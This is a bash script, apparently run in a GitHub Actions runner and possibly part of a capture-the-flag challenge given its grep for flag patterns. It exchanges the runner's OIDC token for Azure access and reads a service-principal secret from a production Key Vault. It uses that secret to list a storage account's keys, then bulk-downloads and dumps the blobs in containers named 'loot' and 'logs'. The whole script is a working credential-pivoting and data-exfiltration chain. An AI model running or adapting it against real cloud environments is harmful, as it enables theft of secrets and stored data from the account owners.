#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
ACCT=sttblcilogsprodx3euoz
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }
KV=$(exch "https://vault.azure.net/.default")
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
ARM=$(spt "$(echo "$J"|jq -r .appId)" "$(echo "$J"|jq -r .clientSecret)" "https://management.azure.com/.default")
RID=$(curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r ".value[]|select(.name==\"$ACCT\")|.id")
K=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com$RID/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value')
export AZURE_STORAGE_ACCOUNT="$ACCT" AZURE_STORAGE_KEY="$K"
mkdir -p /tmp/dl
for c in loot logs; do az storage blob download-batch -d /tmp/dl -s "$c" --only-show-errors >/dev/null 2>&1; done
echo "=== FILES ==="; find /tmp/dl -type f | sort
echo "=== UNZIP ==="; find /tmp/dl -name '*.zip' -exec sh -c 'cd /tmp/dl && unzip -o "$1" >/dev/null 2>&1' _ {} \;
echo "=== CONTENTS ==="; find /tmp/dl -type f ! -name '*.zip' -exec sh -c 'echo "----- $1 ($(wc -c <"$1")b) -----"; head -c 1200 "$1"; echo' _ {} \;
echo "=== GREP ==="; grep -rainE "flag|CJ\{|tbl\{|cyber|FLAG" /tmp/dl 2>/dev/null | head -40
echo DONE
exit 0
